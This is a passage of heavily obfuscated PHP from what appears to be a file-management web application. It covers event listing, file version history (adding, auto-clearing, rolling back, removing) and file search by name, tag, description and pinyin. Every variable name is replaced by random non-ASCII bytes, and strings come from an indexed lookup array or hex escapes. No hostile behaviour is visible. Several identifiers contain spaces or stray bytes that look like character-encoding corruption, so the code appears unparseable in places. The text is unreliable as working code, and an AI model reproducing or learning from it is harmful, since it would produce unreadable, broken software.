É‘Ò‰«, $_SERVER[ÀÆ][543]); } public function eventRename($éóøÂêĞ, $±ı, $Ãú†ÂÄÒÓ‹¢) { $†”Á¸í =& $_SERVER[ÀÆ]; $Ü†‹ = array($†”Á¸í[1087] => $±ı, $†”Á¸í[1088] => $Ãú†ÂÄÒÓ‹¢); return $this->addEvent($éóøÂêĞ, $†”Á¸í[1264], $Ü†‹); } public function eventAddComment($ŸÅ±ºè‘Ùµ, $Š›ÑÎÈ²ˆ) { return $this->addEvent($ŸÅ±ºè‘Ùµ, $_SERVER[ÀÆ][1968], $Š›ÑÎÈ²ˆ); } public function eventAddDesc($¿÷Ù±, $£ç) { return $this->addEvent($¿÷Ù±, $_SERVER[ÀÆ][1969], $£ç); } public function listBySource($ª‡ñ) { $±¨™»éÇö»ƒ =& $_SERVER[ÀÆ]; $”ëåïŒ¦â = Model($±¨™»éÇö»ƒ[1250])->sourceInfo($ª‡ñ); $£ÍÛ†à‹˜²Ê = array($±¨™»éÇö»ƒ[412] => $ª‡ñ); if ($”ëåïŒ¦â[$±¨™»éÇö»ƒ[405]] == $±¨™»éÇö»ƒ[87]) { $ûÍò” = Model($±¨™»éÇö»ƒ[1250])->listSearchChildren($ª‡ñ, 20000); $ûÍò”[] = $ª‡ñ . $±¨™»éÇö»ƒ[376]; $£ÍÛ†à‹˜²Ê = array($±¨™»éÇö»ƒ[397] => array($±¨™»éÇö»ƒ[7], $ûÍò”)); } $åáÍ½ßÁ€ = $this->where($£ÍÛ†à‹˜²Ê)->order($±¨™»éÇö»ƒ[1970])->selectPage(); if ($åáÍ½ßÁ€[$±¨™»éÇö»ƒ[364]][$±¨™»éÇö»ƒ[365]] == 0) { $åáÍ½ßÁ€[$±¨™»éÇö»ƒ[364]][$±¨™»éÇö»ƒ[365]] = 1; $åáÍ½ßÁ€[$±¨™»éÇö»ƒ[367]] = array(array($±¨™»éÇö»ƒ[412] => $ª‡ñ, $±¨™»éÇö»ƒ[1953] => $”ëåïŒ¦â[$±¨™»éÇö»ƒ[492]], $±¨™»éÇö»ƒ[1563] => $”ëåïŒ¦â[$±¨™»éÇö»ƒ[446]], $±¨™»éÇö»ƒ[417] => $±¨™»éÇö»ƒ[1971], $±¨™»éÇö»ƒ[418] => $”ëåïŒ¦â[$±¨™»éÇö»ƒ[194]], $±¨™»éÇö»ƒ[1565] => $±¨™»éÇö»ƒ[33])); } return $this->eventListParse($åáÍ½ßÁ€, $ª‡ñ); } private function eventListParse($‰«×ì–ï‚Ğ, $£¦) { $Æù·û­‰‹ì =& $_SERVER[ÀÆ]; $ŞÏ•à®ÓÔü = $‰«×ì–ï‚Ğ[$Æù·û­‰‹ì[367]]; $®ëÔ = array_to_keyvalue($ŞÏ•à®ÓÔü, $Æù·û­‰‹ì[33], $Æù·û­‰‹ì[397]); $Ø¼ä¡†ß = array_to_keyvalue($ŞÏ•à®ÓÔü, $Æù·û­‰‹ì[33], $Æù·û­‰‹ì[1959]); foreach ($ŞÏ•à®ÓÔü as $ÄØàÄ€¶¹‘Ÿ¥) { $œúÀ = $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]]; if ($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[29]] == $Æù·û­‰‹ì[545] && isset($œúÀ[$Æù·û­‰‹ì[1087]])) { $®ëÔ[] = $œúÀ[$Æù·û­‰‹ì[1087]] . $Æù·û­‰‹ì[33]; $®ëÔ[] = $œúÀ[$Æù·û­‰‹ì[1088]] . $Æù·û­‰‹ì[33]; } if ($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[29]] == $Æù·û­‰‹ì[1967] && isset($œúÀ[$Æù·û­‰‹ì[397]])) { $®ëÔ[] = $œúÀ[$Æù·û­‰‹ì[397]] . $Æù·û­‰‹ì[33]; } } $®ëÔ = array_merge($®ëÔ, $Ø¼ä¡†ß, array($£¦ . $Æù·û­‰‹ì[33])); $®ëÔ = array_unique($®ëÔ); $¬°¬ = array_unique(array_to_keyvalue($ŞÏ•à®ÓÔü, $Æù·û­‰‹ì[33], $Æù·û­‰‹ì[1572])); $€¥ãé‚öèÚ = Model($Æù·û­‰‹ì[532])->userListInfo($¬°¬); $¢ûóší¶¡«‹¨ = Model($Æù·û­‰‹ì[817])->sourceListInfo($®ëÔ, !0); foreach ($ŞÏ•à®ÓÔü as &$ÄØàÄ€¶¹‘Ÿ¥) { if ($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[29]] == $Æù·û­‰‹ì[545] && isset($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[1087]])) { $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[1087]] = $¢ûóší¶¡«‹¨[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[1087]]]; $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[1088]] = $¢ûóší¶¡«‹¨[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[1088]]]; } if ($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[29]] == $Æù·û­‰‹ì[1967] && isset($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[397]])) { $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[397]] = $¢ûóší¶¡«‹¨[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[445]][$Æù·û­‰‹ì[397]]]; } $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[85]] = $¢ûóší¶¡«‹¨[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[397]]]; $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1972]] = $¢ûóší¶¡«‹¨[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1959]]]; if ($ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[29]] == $Æù·û­‰‹ì[1707]) { $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1972]] = $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[85]]; $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1959]] = $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1972]][$Æù·û­‰‹ì[397]]; $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[85]] = !1; $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[397]] = $Æù·û­‰‹ì[33]; } $ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1904]] = $€¥ãé‚öèÚ[$ÄØàÄ€¶¹‘Ÿ¥[$Æù·û­‰‹ì[1572]]]; } unset($ÄØàÄ€¶¹‘Ÿ¥); $‰«×ì–ï‚Ğ[$Æù·û­‰‹ì[367]] = $ŞÏ•à®ÓÔü; return $‰«×ì–ï‚Ğ; } public function removeBySource($×˜ß¢ä Âß) { $µ¢şª´¹ = array($_SERVER[ÀÆ][412] => $×˜ß¢ä Âß); $this->where($µ¢şª´¹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\x65\137\x68\x69\x73\x74\157\x72\171"; public function historyCount($½€‹‰à£şóŞÓ) { $À¼€à‰áÄ =& $_SERVER[ÀÆ]; if (!$½€‹‰à£şóŞÓ) { return array(); } if (is_string($½€‹‰à£şóŞÓ) || is_int($½€‹‰à£şóŞÓ)) { $½€‹‰à£şóŞÓ = array($½€‹‰à£şóŞÓ); } $Ôµãã = array($À¼€à‰áÄ[397], $À¼€à‰áÄ[1771] => $À¼€à‰áÄ[494]); $„ç…‘ŸÀ– = array($À¼€à‰áÄ[397] => array($À¼€à‰áÄ[7], $½€‹‰à£şóŞÓ)); $…ˆ¾» = $this->field($Ôµãã)->where($„ç…‘ŸÀ–)->group($À¼€à‰áÄ[397])->select(); return array_to_keyvalue($…ˆ¾», $À¼€à‰áÄ[397], $À¼€à‰áÄ[494]); } public function addHistory($ËŞ”¾Îª, $ù¨åÖ’Ñ¨ = '') { $ÈæÙ¥Ï“ =& $_SERVER[ÀÆ]; $íŸÆ½»„Ê¿ğ = array($ÈæÙ¥Ï“[412] => $ËŞ”¾Îª[$ÈæÙ¥Ï“[397]], $ÈæÙ¥Ï“[1563] => isset($ËŞ”¾Îª[$ÈæÙ¥Ï“[448]]) ? $ËŞ”¾Îª[$ÈæÙ¥Ï“[448]] : $ËŞ”¾Îª[$ÈæÙ¥Ï“[446]], $ÈæÙ¥Ï“[462] => $ËŞ”¾Îª[$ÈæÙ¥Ï“[461]], $ÈæÙ¥Ï“[573] => $ËŞ”¾Îª[$ÈæÙ¥Ï“[78]], $ÈæÙ¥Ï“[1973] => $ù¨åÖ’Ñ¨); $›Àí¸Ã˜ß = $GLOBALS[$ÈæÙ¥Ï“[6]][$ÈæÙ¥Ï“[88]][$ÈæÙ¥Ï“[1136]]; if ($›Àí¸Ã˜ß > 1) { $this->historyAutoClear($íŸÆ½»„Ê¿ğ[$ÈæÙ¥Ï“[397]]); $this->add($íŸÆ½»„Ê¿ğ); } Hook::trigger($ÈæÙ¥Ï“[1974], $íŸÆ½»„Ê¿ğ); Model($ÈæÙ¥Ï“[1975])->eventFileEdit($ËŞ”¾Îª[$ÈæÙ¥Ï“[397]]); } private function historyAutoClear($óîòøı) { $¿È¬ÔÖ =& $_SERVER[ÀÆ]; $×„„ = Model($¿È¬ÔÖ[755])->get($¿È¬ÔÖ[1158]); $ÎÍØàõ“å = $GLOBALS[$¿È¬ÔÖ[6]][$¿È¬ÔÖ[88]][$¿È¬ÔÖ[1136]]; $Â‡¸İş“‰Öä = $×„„ == $¿È¬ÔÖ[1159] ? 5 : $ÎÍØàõ“å; if ($ÎÍØàõ“å <= 1) { $Â‡¸İş“‰Öä = 1; } if ($Â‡¸İş“‰Öä >= 500) { return; } $ÆÀ¥¯ˆäûŞ¸ = array($¿È¬ÔÖ[412] => $óîòøı); $¾Á = $this->field($¿È¬ÔÖ[1976])->where($ÆÀ¥¯ˆäûŞ¸)->order($¿È¬ÔÖ[1970])->select(); if (!$¾Á || $Â‡¸İş“‰Öä >= count($¾Á)) { return; } $çèÎà× = array_to_keyvalue($¾Á, $¿È¬ÔÖ[33], $¿È¬ÔÖ[395]); $çèÎà× = array_slice($çèÎà×, $Â‡¸İş“‰Öä); $ã¯ = array_to_keyvalue($¾Á, $¿È¬ÔÖ[33], $¿È¬ÔÖ[461]); $ã¯ = array_slice($ã¯, $Â‡¸İş“‰Öä); if (!$çèÎà× || !$ã¯) { return; } $ÆÀ¥¯ˆäûŞ¸ = array($¿È¬ÔÖ[414] => array($¿È¬ÔÖ[7], $çèÎà×)); $this->where($ÆÀ¥¯ˆäûŞ¸)->delete(); Model($¿È¬ÔÖ[464])->remove($ã¯); } public function listData($Şş‚Ë¨Ò‡â) { $‚«•´ =& $_SERVER[ÀÆ]; $õÕ°Ó‘ = array($‚«•´[412] => $Şş‚Ë¨Ò‡â); $Áô¢Ø‚ = $‚«•´[1977]; $¡”º‹ = $this->field($Áô¢Ø‚)->where($õÕ°Ó‘)->order($‚«•´[1970])->selectPage(); $this->_listAppendUser($¡”º‹[$‚«•´[367]]); $¢é«Š¬¢ = Model($‚«•´[755])->get($‚«•´[1158]); $†Ç = 5; if ($¢é«Š¬¢ == $‚«•´[1159]) { $¡”º‹[$‚«•´[367]] = array_slice($¡”º‹[$‚«•´[367]], 0, $†Ç); $¡”º‹[$‚«•´[364]] = array($‚«•´[1978] => 1, $‚«•´[1979] => 20, $‚«•´[1980] => 1, $‚«•´[1981] => count($¡”º‹[$‚«•´[367]])); } return $¡”º‹; } protected function _listAppendUser(&$°¹öÔÓµ) { $ˆÌşÊû»ï— =& $_SERVER[ÀÆ]; $å‡‡áâ = array_to_keyvalue($°¹öÔÓµ, $ˆÌşÊû»ï—[33], $ˆÌşÊû»ï—[1572]); $©§»áãˆš = Model($ˆÌşÊû»ï—[532])->userListInfo($å‡‡áâ); foreach ($°¹öÔÓµ as &$äÔŠô) { $Õ«í¦»ÒÛèÇ = $äÔŠô[$ˆÌşÊû»ï—[1572]]; $äÔŠô[$ˆÌşÊû»ï—[446]] = $©§»áãˆš[$Õ«í¦»ÒÛèÇ] ? $©§»áãˆš[$Õ«í¦»ÒÛèÇ] : !1; } unset($äÔŠô); } public function fileInfo($Æ°É™¨ê’) { $ìàú¿ =& $_SERVER[ÀÆ]; $øŞÀË = $this->tablePrefix; $×½ğ = "{$øŞÀË}\151\157\x5f\146\151\154\x65\x20\146\x69\154\x65\x73\x20\157\156\40\146\x69\154\x65\163\x2e\146\151\154\145\111\x44\x20\x3d\40\150\x69\163\x74\157\162\x79\56\x66\x69\154\145\x49\x44"; return $this->alias($ìàú¿[1982])->where(array($ìàú¿[414] => $Æ°É™¨ê’))->join($×½ğ, $ìàú¿[1983])->find(); } public function removeItem($½ÇÅ) { $¡» =& $_SERVER[ÀÆ]; $à­…ó¤Ş¸» = array($¡»[414] => $½ÇÅ); $ğèüö = $this->where($à­…ó¤Ş¸»)->find(); if ($ğèüö) { $½îßñûıî¿ = $this->where($à­…ó¤Ş¸»)->delete(); Model($¡»[464])->remove($ğèüö[$¡»[461]]); return $½îßñûıî¿; } return !1; } public function removeBySource($Æ¿ˆøğĞá¸) { $ÄÈ‘ =& $_SERVER[ÀÆ]; if (!$Æ¿ˆøğĞá¸) { return !1; } if (!is_array($Æ¿ˆøğĞá¸)) { $Æ¿ˆøğĞá¸ = array($Æ¿ˆøğĞá¸); } $®Âà„ = array($ÄÈ‘[412] => array($ÄÈ‘[7], $Æ¿ˆøğĞá¸)); $¨ÌÒ¿¡î‚Ñ = $this->field($ÄÈ‘[462])->where($®Âà„)->select(); if ($¨ÌÒ¿¡î‚Ñ) { $this->where($®Âà„)->delete(); $°‚¤¿ÉÜİ¬Åù = array_to_keyvalue($¨ÌÒ¿¡î‚Ñ, $ÄÈ‘[33], $ÄÈ‘[461]); Model($ÄÈ‘[464])->remove($°‚¤¿ÉÜİ¬Åù); } return !0; } public function setDetail($ù€ÛàÚù–, $Å©ßî) { $‰‹—å¦î =& $_SERVER[ÀÆ]; return $this->where(array($‰‹—å¦î[414] => $ù€ÛàÚù–))->save(array($‰‹—å¦î[1973] => $Å©ßî)); } public function rollbackToItem($ûå¦ØÂ—, $òÕÅ) { $ÜƒşÉÑò±Ä =& $_SERVER[ÀÆ]; $úãîç£¦ÕŠ = Model($ÜƒşÉÑò±Ä[817])->sourceInfo($ûå¦ØÂ—); $this->addHistory($úãîç£¦ÕŠ, LNG($ÜƒşÉÑò±Ä[1984])); $‡˜„¯Ë°•œÀ = $this->find($òÕÅ); $Á£÷†‚ = array($ÜƒşÉÑò±Ä[461] => $‡˜„¯Ë°•œÀ[$ÜƒşÉÑò±Ä[461]], $ÜƒşÉÑò±Ä[78] => $‡˜„¯Ë°•œÀ[$ÜƒşÉÑò±Ä[78]], $ÜƒşÉÑò±Ä[84] => time(), $ÜƒşÉÑò±Ä[448] => USER_ID); Model($ÜƒşÉÑò±Ä[817])->where(array($ÜƒşÉÑò±Ä[397] => $ûå¦ØÂ—))->save($Á£÷†‚); return $this->where(array($ÜƒşÉÑò±Ä[414] => $òÕÅ))->delete(); } public function clearSame($ŸÏÁÍ) { $ßò¤õ¸¡ë =& $_SERVER[ÀÆ]; $ÑÑ²çÀÜÎ  = $this->listData($ŸÏÁÍ); $ôáĞê¡Ó¾¹ú = array_to_keyvalue_group($ÑÑ²çÀÜÎ , $ßò¤õ¸¡ë[461]); $ƒ = array(); $Úæ°¶ã§ê = array(); foreach ($ôáĞê¡Ó¾¹ú as $¸úÀÚ) { if (!$¸úÀÚ || count($¸úÀÚ) <= 1) { continue; } foreach ($¸úÀÚ as $Ğ­”) { $ƒ[] = $Ğ­”[$ßò¤õ¸¡ë[461]]; $Úæ°¶ã§ê[] = $Ğ­”[$ßò¤õ¸¡ë[395]]; } } if (!$Úæ°¶ã§ê) { return; } $this->where(array($ßò¤õ¸¡ë[395] => array($ßò¤õ¸¡ë[7], $Úæ°¶ã§ê)))->delete(); Model($ßò¤õ¸¡ë[464])->remove($ƒ); } public function userSpace() { $ÖÁ =& $_SERVER[ÀÆ]; $¢Ÿ‡Ê = $this->tablePrefix; $âÏºëö×À = array($ÖÁ[1563] => USER_ID); $°„ğ = "{$¢Ÿ‡Ê}\151\x6f\x5f\x66\151\154\x65\x20\146\151\154\x65\x73\40\x6f\156\x20\146\x69\x6c\x65\163\56\146\x69\x6c\x65\x49\104\x20\75\40\x68\151\x73\164\x6f\x72\171\x2e\x66\x69\154\145\x49\x44"; return $this->alias($ÖÁ[1982])->where($âÏºëö×À)->join($°„ğ, $ÖÁ[1983])->sum($ÖÁ[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($™Ä) { $×¶÷É‘§ÛœÂ =& $_SERVER[ÀÆ]; $³ˆáæòóâÙˆÑ = KodIO::fileTypeList(); $ÃïŸë = $³ˆáæòóâÙˆÑ[$™Ä]; if (!$ÃïŸë) { return array(); } $¢‡Ó¼ÓĞ§ = $ÃïŸë[$×¶÷É‘§ÛœÂ[168]]; $˜Ñ¤õ = $×¶÷É‘§ÛœÂ[7]; if (!$ÃïŸë[$×¶÷É‘§ÛœÂ[168]]) { $ªÈğò½ôú±™ = array_to_keyvalue($³ˆáæòóâÙˆÑ, $×¶÷É‘§ÛœÂ[33], $×¶÷É‘§ÛœÂ[168]); $¢‡Ó¼ÓĞ§ = implode($×¶÷É‘§ÛœÂ[47], $ªÈğò½ôú±™); $˜Ñ¤õ = $×¶÷É‘§ÛœÂ[1985]; } $Ä’ØÒ = explode($×¶÷É‘§ÛœÂ[47], trim($¢‡Ó¼ÓĞ§, $×¶÷É‘§ÛœÂ[47])); return array($˜Ñ¤õ, $Ä’ØÒ); } public function listPathType($¢‡¾Àïí¯) { $§¹òçÇœËø =& $_SERVER[ÀÆ]; $òˆ‰Åè‰‘ = $this->fileTypeWhere($¢‡¾Àïí¯); if (!$òˆ‰Åè‰‘) { return array(); } $Î¹áõ¹“Œ½· = array($§¹òçÇœËø[574] => SourceModel::TYPE_USER, $§¹òçÇœËø[575] => USER_ID, $§¹òçÇœËø[571] => 0, $§¹òçÇœËø[572] => $òˆ‰Åè‰‘); return $this->listSource($Î¹áõ¹“Œ½·); } public function listSearch($€Ÿ, $øĞŞŸóÕş¤¤“ = 300) { $ûÃ¼ =& $_SERVER[ÀÆ]; if (isset($€Ÿ[$ûÃ¼[1830]]) && $€Ÿ[$ûÃ¼[1830]]) { $€Ÿ[$ûÃ¼[1830]] = str_replace($ûÃ¼[382], $ûÃ¼[1986], trim($€Ÿ[$ûÃ¼[1830]])); } $ˆÎ = $this->_parseSearchWhere($€Ÿ); $˜‡ = $ˆÎ; if (!isset($ˆÎ[$ûÃ¼[425]])) { $ˆÎ[$ûÃ¼[425]] = 0; } $öÆ = $ûÃ¼[1987]; $Áº = $öÆ; $this->_listSearchBindPinyin($€Ÿ, $ˆÎ, $öÆ); $this->alias($ûÃ¼[438])->_makeOrder(); $ˆÎ = $this->parseWhereLike($ˆÎ); $Ò’ôøÛØêºÔ = $this->distinct(!0)->field($öÆ)->where($ˆÎ)->selectPage($øĞŞŸóÕş¤¤“); $this->_listSearchFileContent($Ò’ôøÛØêºÔ, $€Ÿ, $Áº, $˜‡); $this->_listSearchDesc($Ò’ôøÛØêºÔ, $€Ÿ, $Áº); $this->_listSearchTag($Ò’ôøÛØêºÔ, $€Ÿ, $Áº); $this->_listSearchGroupTag($Ò’ôøÛØêºÔ, $€Ÿ, $Áº); $this->_listDataApply($Ò’ôøÛØêºÔ[$ûÃ¼[367]]); $this->_listMake($Ò’ôøÛØêºÔ); return $Ò’ôøÛØêºÔ; } private function _listSearchFileContent(&$ô, $ĞŞŠ„, $Ïœ’, $öÌ™ÊŞÊòü) { $œ›ØŒ¬ =& $_SERVER[ÀÆ]; if (!$ĞŞŠ„[$œ›ØŒ¬[1830]] || $ô[$œ›ØŒ¬[364]][$œ›ØŒ¬[351]] > 1) { return; } if (!isset($öÌ™ÊŞÊòü[$œ›ØŒ¬[28]]) || !is_array($ĞŞŠ„[$œ›ØŒ¬[461]])) { return; } $öÌ™ÊŞÊòü[$œ›ØŒ¬[461]] = array($œ›ØŒ¬[7], $ĞŞŠ„[$œ›ØŒ¬[461]]); unset($öÌ™ÊŞÊòü[$œ›ØŒ¬[28]]); unset($ĞŞŠ„[$œ›ØŒ¬[461]]); $¥¨”¸¡ = $this->field($Ïœ’)->where($öÌ™ÊŞÊòü)->limit($œ›ØŒ¬[1988])->select(); if (!$¥¨”¸¡ || count($¥¨”¸¡) == 0) { return; } $ô[$œ›ØŒ¬[367]] = array_merge($¥¨”¸¡, $ô[$œ›ØŒ¬[367]]); $ô[$œ›ØŒ¬[364]][$œ›ØŒ¬[365]] += count($¥¨”¸¡); } private function _listSearchTag(&$–úéª®³œ¿Úœ, $ÁÛ¤€×²½, $Ÿş–±¾ÌÌƒ) { $úÙÃóé =& $_SERVER[ÀÆ]; if (!$ÁÛ¤€×²½[$úÙÃóé[1830]] || $–úéª®³œ¿Úœ[$úÙÃóé[364]][$úÙÃóé[351]] > 1) { return; } $¡Øª‹ = Model($úÙÃóé[1989])->listData(); $·Ú¹»¦ÏÕ = array(); $øæªù¸ = $ÁÛ¤€×²½[$úÙÃóé[1830]]; foreach ($¡Øª‹ as $·‚Á¬÷ğ™ü) { $®à = $·‚Á¬÷ğ™ü[$úÙÃóé[28]]; $àñ›Ğœ“ÛºÍÍ = str_replace($úÙÃóé[50], $úÙÃóé[33], Pinyin::get($®à)); if (stripos($®à, $øæªù¸) !== !1 || stripos($àñ›Ğœ“ÛºÍÍ, $øæªù¸) !== !1) { $·Ú¹»¦ÏÕ[] = $·‚Á¬÷ğ™ü[$úÙÃóé[395]]; } } if (!$·Ú¹»¦ÏÕ) { return; } $±–®ÛªÁÇ­Ğ = array($úÙÃóé[421] => array($úÙÃóé[7], $·Ú¹»¦ÏÕ), $úÙÃóé[1572] => USER_ID); $Í—ÕöÔ = Model($úÙÃóé[422])->field($úÙÃóé[76])->where($±–®ÛªÁÇ­Ğ)->select(); $Í—ÕöÔ = array_to_keyvalue($Í—ÕöÔ, $úÙÃóé[33], $úÙÃóé[76]); $€îáû¥‚ó£ = array_unique($Í—ÕöÔ); $this->_listSearchMerge($–úéª®³œ¿Úœ, $ÁÛ¤€×²½, $Ÿş–±¾ÌÌƒ, $€îáû¥‚ó£); } private function _listSearchDesc(&$§ıú¸†¯¯, $•©ıÏ³¹×Ó, $ÕÓÜÙ²Üèï) { $İæœ…™ =& $_SERVER[ÀÆ]; if (!$•©ıÏ³¹×Ó[$İæœ…™[1830]] || $§ıú¸†¯¯[$İæœ…™[364]][$İæœ…™[351]] > 1) { return; } $‹óä®Êû‚è = $this->listSearchChildren($•©ıÏ³¹×Ó[$İæœ…™[492]]); $‹óä®Êû‚è = array_unique($‹óä®Êû‚è); if (!$‹óä®Êû‚è) { return; } $§‹ş¸¦° = array($İæœ…™[397] => array($İæœ…™[7], $‹óä®Êû‚è), $İæœ…™[93] => $İæœ…™[445], $İæœ…™[372] => array($İæœ…™[381], $İæœ…™[1832] . $•©ıÏ³¹×Ó[$İæœ…™[1830]] . $İæœ…™[1832])); $ØÇ®Æ©”Ãíç¼ = Model($İæœ…™[557])->field($İæœ…™[397])->where($§‹ş¸¦°)->select(); $ù¸ç‰ = array_to_keyvalue($ØÇ®Æ©”Ãíç¼, $İæœ…™[33], $İæœ…™[397]); $this->_listSearchMerge($§ıú¸†¯¯, $•©ıÏ³¹×Ó, $ÕÓÜÙ²Üèï, $ù¸ç‰); } private function _listSearchGroupTag(&$ŸİÒĞ§±, $ÀÒ¥, $æÚêš¯±âÒå²) { $¤ĞöíÎ =& $_SERVER[ÀÆ]; if (!$ÀÒ¥[$¤ĞöíÎ[1830]] || $ŸİÒĞ§±[$¤ĞöíÎ[364]][$¤ĞöíÎ[351]] > 1 || !$ÀÒ¥[$¤ĞöíÎ[492]]) { return; } $ôĞ = $this->sourceInfo($ÀÒ¥[$¤ĞöíÎ[492]]); if (!$ôĞ || $ôĞ[$¤ĞöíÎ[406]] != SourceModel::TYPE_GROUP) { return; } $ú“áç¨£àÆ´ = $ôĞ[$¤ĞöíÎ[498]]; $“™í = Model($¤ĞöíÎ[1990])->get($ú“áç¨£àÆ´); $ñÆ¯Îç²‰—ã = array(); $Ò³ = $ÀÒ¥[$¤ĞöíÎ[1830]]; foreach ($“™í[$¤ĞöíÎ[367]] as $é„ï„ÈõŞ·») { $èŞ÷ÖØ†¼ì = $é„ï„ÈõŞ·»[$¤ĞöíÎ[28]]; $ˆ­Ì§·ŞÅ = str_replace($¤ĞöíÎ[50], $¤ĞöíÎ[33], Pinyin::get($èŞ÷ÖØ†¼ì)); if (stripos($èŞ÷ÖØ†¼ì, $Ò³) !== !1 || stripos($ˆ­Ì§·ŞÅ, $Ò³) !== !1) { $ñÆ¯Îç²‰—ã[] = $é„ï„ÈõŞ·»[$¤ĞöíÎ[395]]; } } if (!$ñÆ¯Îç²‰—ã) { return; } $Ô¬š“Ëß•µö = array($¤ĞöíÎ[421] => array($¤ĞöíÎ[7], $ñÆ¯Îç²‰—ã), $¤ĞöíÎ[1572] => 0, $¤ĞöíÎ[29] => $¤ĞöíÎ[1854] . $ú“áç¨£àÆ´); $Ñä¯¡Ä = Model($¤ĞöíÎ[422])->field($¤ĞöíÎ[76])->where($Ô¬š“Ëß•µö)->select(); $Ñä¯¡Ä = array_to_keyvalue($Ñä¯¡Ä, $¤ĞöíÎ[33], $¤ĞöíÎ[76]); $’à¡¹¹ = array_unique($Ñä¯¡Ä); $this->_listSearchMerge($ŸİÒĞ§±, $ÀÒ¥, $æÚêš¯±âÒå², $’à¡¹¹); } private function _listSearchMerge(&$îÃ°ØŠ, $œà»Ù, $…Ò–ëÕ, $ÎñÀ«½) { $ËñÇÒ´É® =& $_SERVER[ÀÆ]; if (!$ÎñÀ«½) { return; } $¼Ö ¨ã³µ = array_to_keyvalue($îÃ°ØŠ[$ËñÇÒ´É®[367]], $ËñÇÒ´É®[33], $ËñÇÒ´É®[397]); $ëŸÃ¸¿„—… = array_diff($ÎñÀ«½, $¼Ö ¨ã³µ); if (!$ëŸÃ¸¿„—…) { return; } $è‹¸‘ú´ = array($ËñÇÒ´É®[397] => array($ËñÇÒ´É®[7], $ëŸÃ¸¿„—…)); $©Ô«å = $this->field($…Ò–ëÕ)->where($è‹¸‘ú´)->select(); if (!$©Ô«å) { return; } $ÜŠ¤®¼ÊıçŒ = array(); foreach ($©Ô«å as $ÊŞˆÉã€õ) { if ($this->_listSearchFilter($ÊŞˆÉã€õ, $œà»Ù)) { $ÜŠ¤®¼ÊıçŒ[] = $ÊŞˆÉã€õ; } } $îÃ°ØŠ[$ËñÇÒ´É®[367]] = array_merge($ÜŠ¤®¼ÊıçŒ, $îÃ°ØŠ[$ËñÇÒ´É®[367]]); $îÃ°ØŠ[$ËñÇÒ´É®[364]][$ËñÇÒ´É®[365]] += count($ÜŠ¤®¼ÊıçŒ); } private function _listSearchFilter($¼»¾, $İÈÂ) { $ªî¤ÏŒ =& $_SERVER[ÀÆ]; $¼î»„« = $¼»¾[$ªî¤ÏŒ[405]] == $ªî¤ÏŒ[87]; if (!strstr($¼»¾[$ªî¤ÏŒ[515]], $ªî¤ÏŒ[47] . $İÈÂ[$ªî¤ÏŒ[492]] . $ªî¤ÏŒ[47])) { return !1; } if (isset($İÈÂ[$ªî¤ÏŒ[407]]) && $İÈÂ[$ªî¤ÏŒ[407]] != $ªî¤ÏŒ[1793]) { if ($İÈÂ[$ªî¤ÏŒ[407]] == $ªî¤ÏŒ[77] && !$¼î»„«) { return !1; } if ($İÈÂ[$ªî¤ÏŒ[407]] != $ªî¤ÏŒ[77] && $¼î»„«) { return !1; } if (!strstr($¼»¾[$ªî¤ÏŒ[168]], $ªî¤ÏŒ[47] . $İÈÂ[$ªî¤ÏŒ[407]] . $ªî¤ÏŒ[47])) { return !1; } } if (isset($İÈÂ[$ªî¤ÏŒ[1991]]) && $İÈÂ[$ªî¤ÏŒ[1991]] < $¼»¾[$ªî¤ÏŒ[78]]) { return !1; } if (isset($İÈÂ[$ªî¤ÏŒ[1992]]) && $İÈÂ[$ªî¤ÏŒ[1992]] > $¼»¾[$ªî¤ÏŒ[78]]) { return !1; } if (isset($İÈÂ[$ªî¤ÏŒ[588]]) && $İÈÂ[$ªî¤ÏŒ[588]] != $¼»¾[$ªî¤ÏŒ[448]]) { return !1; } return !0; } public function listSearchChildren($‹Å•ôÇ, $’ê½©ŸÌÉÔõ = 5000) { $ğ˜ªÆÕê…õ“– =& $_SERVER[ÀÆ]; $ç¼ = array(); $œ•‡• = $this->sourceInfo($‹Å•ôÇ); $”ê“Ï = array($ğ˜ªÆÕê…õ“–[515] => array($ğ˜ªÆÕê…õ“–[381], $œ•‡•[$ğ˜ªÆÕê…õ“–[515]] . $œ•‡•[$ğ˜ªÆÕê…õ“–[397]] . $ğ˜ªÆÕê…õ“–[539])); $íˆâı = $this->field($ğ˜ªÆÕê…õ“–[397])->cache(null, 600)->where($”ê“Ï)->count(); if ($íˆâı > $’ê½©ŸÌÉÔõ) { return $this->_listSearchChildrenNear($‹Å•ôÇ, $’ê½©ŸÌÉÔõ); } 